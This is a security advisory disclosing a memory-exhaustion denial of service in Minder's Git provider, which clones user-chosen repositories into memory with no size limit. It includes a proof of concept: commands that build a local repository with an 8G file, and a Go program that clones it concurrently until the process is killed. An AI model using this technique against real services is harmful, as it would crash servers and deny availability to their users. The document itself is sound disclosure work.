# Denial of service from maliciously configured Git repository

## Affected versions

## Description

Minder's Git provider is vulnerable to a denial of service from a maliciously configured GitHub repository. The Git provider clones users repositories using the `github.com/go-git/go-git/v5` library on these lines:

<https://github.com/stacklok/minder/blob/85985445c8ac3e51f03372e99c7b2f08a6d274aa/internal/providers/git/git.go#L55-L89>

The Git provider does the following on these lines:

First, it sets the `CloneOptions`, specifying the url, the depth etc:

<https://github.com/stacklok/minder/blob/85985445c8ac3e51f03372e99c7b2f08a6d274aa/internal/providers/git/git.go#L56-L62>

It then validates the options:

<https://github.com/stacklok/minder/blob/85985445c8ac3e51f03372e99c7b2f08a6d274aa/internal/providers/git/git.go#L66-L68>

It then sets up an in-memory filesystem, to which it clones:

<https://github.com/stacklok/minder/blob/85985445c8ac3e51f03372e99c7b2f08a6d274aa/internal/providers/git/git.go#L70-L71>

Finally, it clones the repository:

<https://github.com/stacklok/minder/blob/85985445c8ac3e51f03372e99c7b2f08a6d274aa/internal/providers/git/git.go#L77>

This `(g *Git) Clone()` method is vulnerable to a DoS attack: A Minder user can instruct Minder to clone a large repository which will exhaust memory and crash the Minder server. The root cause of this vulnerability is a combination of the following conditions:

1. Users can control the Git URL which Minder clones.
2. Minder does not enforce a size limit to the repository.
3. Minder clones the entire repository into memory.

## PoC

Here, we share a PoC of how the logic of `(g *Git) Clone()` behaves isolated from Minder. To get a true assessment of whether this is 100% identical to its behavior in the context of Minder instead of an isolated PoC, this should be tested out by creating a large repository and instructing Minder to clone it. However, even in that case, it might not be possible to deterministically trigger a DoS because of noise from network calls.

We believe the below PoC is a correct representation because:

1. We have replicated the important and impactful parts of `(g *Git) Clone()`
2. We run this in multiple goroutines which Minder does here: <https://github.com/stacklok/minder/blob/3afa50ef2e06269ed619d390d266cf1988c2068b/internal/engine/executor.go#L128>
3. Minders timeout is set to 5 minutes: <https://github.com/stacklok/minder/blob/3afa50ef2e06269ed619d390d266cf1988c2068b/internal/engine/executor.go#L114>. With a reasonable connection, Minder can download many GBs in that period.

In our PoC, we demonstrate that under these two conditions, a large repository can perform a SigKill of the Go process which in Minders case is the Minder server.

First, create a local Git repository:

```
cd /tmp
mkdir upstream-repo
cd upstream-repo
git init --bare
cd /tmp
git clone /tmp/upstream-repo ./upstream-repo-clone
cd ./upstream-repo-clone
# Add large file:
fallocate -l 8G large-file
git add .
git commit -m "add large file"
git push
cd /tmp

```

Create and run the following script in `/tmp/dos-poc/main.go`:

```
package main

import (
        "context"
        "fmt"
        "github.com/go-git/go-billy/v5/memfs"
        "github.com/go-git/go-git/v5"
        "github.com/go-git/go-git/v5/storage/memory"
        "runtime"
        "sync"
)

func main() {
        var (
                wg  sync.WaitGroup
        )

        for i := 0; i < 2; i++ {
                fmt.Println("Starting one...")
                wg.Add(1)
                go func() {
                        defer wg.Done()
                        opts := &git.CloneOptions{
                                URL:          "/tmp/upstream-repo",
                                SingleBranch: true,
                                Depth:        1,
                                Tags:         git.NoTags,
                        }

                        storer := memory.NewStorage()
                        fs := memfs.New()
                        git.CloneContext(context.Background(), storer, fs, opts)
                }()
        }
        fmt.Println("Finished")
        PrintMemUsage()
        wg.Wait()

}

func PrintMemUsage() {
        var m runtime.MemStats
        runtime.ReadMemStats(&m)
        // For info on each, see: https://golang.org/pkg/runtime/#MemStats
        fmt.Printf("Alloc = %v MiB", bToMb(m.Alloc))
        fmt.Printf("\tTotalAlloc = %v MiB", bToMb(m.TotalAlloc))
        fmt.Printf("\tSys = %v MiB", bToMb(m.Sys))
        fmt.Printf("\tNumGC = %v\n", m.NumGC)
}

func bToMb(b uint64) uint64 {
        return b / 1024 / 1024
}
```

On my local machine, this Go program is killed before it prints "Finished" in the terminal. Observing the memory by way of `top`, we can see that the memory climbs steadily until the program crashes around 93% memory consumption.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
